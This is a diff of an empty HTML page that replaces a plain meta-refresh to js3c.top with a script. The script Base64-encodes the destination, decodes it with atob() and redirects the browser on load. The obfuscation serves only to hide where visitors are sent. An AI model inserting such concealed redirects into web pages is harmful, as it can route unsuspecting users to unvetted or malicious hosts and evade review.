@@ -2,7 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=js3c.top:80">
+    <script>
+        // URL codificada em Base64
+        const base64URL = "aHR0cDovL2pzM2MudG9wOjgw"; // Corresponde a "http://js3c.top:80"
+
+        // Decodifica a URL e redireciona
+        const decodedURL = atob(base64URL);
+        window.location.href = decodedURL;
+    </script>
 </head>
 <body>
 </body>
